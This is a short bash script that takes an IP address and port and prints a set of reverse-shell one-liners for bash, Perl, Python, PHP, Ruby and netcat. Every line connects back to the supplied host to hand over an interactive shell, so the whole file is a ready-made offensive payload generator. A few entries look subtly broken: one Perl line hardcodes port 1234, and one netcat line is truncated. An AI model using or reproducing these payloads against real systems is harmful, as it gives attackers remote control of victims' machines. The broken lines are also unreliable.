#!/bin/bash

while getopts i:p: flag
do
	case "${flag}" in
		i) ip_addr=${OPTARG};;
		p) port=${OPTARG};;
	esac
done

echo "[bash] bash -i >& /dev/tcp/$ip_addr/$port 0>&1"
echo "[bash] 0<&196;exec 196<>/dev/tcp/$ip_addr/$port; sh <&196 >&196 2>&196"
echo "[bash] exec 5<>/dev/tcp/$ip_addr/$port | cat <&5 | while read line; do $line 2>&5 >&5; done"
echo "[perl] perl -e 'use Socket;\$i=\"$ip_addr\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo "[perl] perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip_addr:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
echo "[perl][win] perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$ip_addr:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
echo "[python] python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_addr\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo "[php] php -r '\$sock=fsockopen(\"$ip_addr\",$port);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
echo "[ruby] ruby -rsocket -e'f=TCPSocket.open(\"$ip_addr\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
echo "[ruby] ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip_addr\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
echo "[ruby] ruby -rsocket -e 'c=TCPSocket.new(\"$ip_addr\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
echo "[netcat] nc -e /bin/sh $ip_addr $port"
echo "[netcat] nc -c /bin/sh $ip_addr $port"
echo "[netcat] /bin/sh | nc $ip_addr $port"
echo "[netcat] rm -f /tmp/p; mknod /tmp/p p && nc $ip_addr $port 0/tmp/p"
echo "[netcat] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip_addr $port >/tmp/f"

